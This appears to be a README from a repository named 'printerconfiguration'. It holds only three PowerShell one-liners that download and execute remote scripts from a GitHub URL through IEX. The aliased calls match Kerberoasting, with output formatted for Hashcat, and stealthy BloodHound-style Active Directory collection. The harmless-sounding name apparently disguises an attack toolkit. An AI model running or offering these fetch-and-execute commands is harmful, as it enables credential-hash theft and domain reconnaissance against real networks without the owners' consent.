# printerconfiguration


```
$browser = New-Object System.Net.WebClient
$browser.Proxy.Credentials =[System.Net.CredentialCache]::DefaultNetworkCredentials 
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printeroast.ps1');I-KR -OutputFormat Hashcat
```

```
IEX($browser).DownloadString('https://raw.githubusercontent.com/tigerion/printerconfiguration/main/printerSharp.ps1');I-BH -CollectionMethod DCOnly -Stealth -NoSaveCache -RandomizeFilenames -EncryptZip
```
